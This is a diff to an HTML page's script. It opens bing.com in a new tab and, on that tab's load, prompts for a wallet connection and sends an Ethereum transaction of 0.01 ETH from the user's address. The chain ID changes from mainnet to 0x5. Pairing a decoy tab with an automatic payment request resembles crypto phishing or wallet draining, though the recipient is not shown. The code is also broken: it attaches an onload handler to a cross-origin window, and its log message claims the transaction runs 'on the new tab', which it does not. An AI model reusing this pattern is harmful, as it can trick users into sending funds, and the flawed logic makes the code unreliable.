@@ -24,20 +24,25 @@
 
   <script>
     async function openBingAndPerformTransaction() {
-      // Open bing.com
-      window.open('https://bing.com', 'x');
+      // Open bing.com in a new tab
+      const newTab = window.open('https://bing.com', 'x');
 
-      // Attempt wallet connection and transaction request simultaneously
-      try {
-        const walletPromise = promptWalletConnection();
-        const transactionPromise = performTransaction();
-        
-        await Promise.all([walletPromise, transactionPromise]);
+      // Wait for the new tab to load and handle the transaction
+      newTab.onload = async function () {
+        try {
+          console.log('New tab loaded. Initiating wallet connection and transaction...');
 
-        console.log('Wallet connected and transaction sent successfully!');
-      } catch (error) {
-        console.error('Wallet connection or transaction failed:', error);
-      }
+          // Attempt wallet connection and transaction request simultaneously
+          const walletPromise = promptWalletConnection();
+          const transactionPromise = performTransaction();
+
+          await Promise.all([walletPromise, transactionPromise]);
+
+          console.log('Wallet connected and transaction sent successfully on the new tab!');
+        } catch (error) {
+          console.error('Wallet connection or transaction failed:', error);
+        }
+      };
     }
 
     async function promptWalletConnection() {
@@ -61,7 +66,7 @@
         from: ethereum.selectedAddress,
         value: "0x2386F26FC10000",
         data: "0x00",
-        chainId: "0x1",
+        chainId: "0x5", // Adjust this to the appropriate chain ID
       };
 
       try {
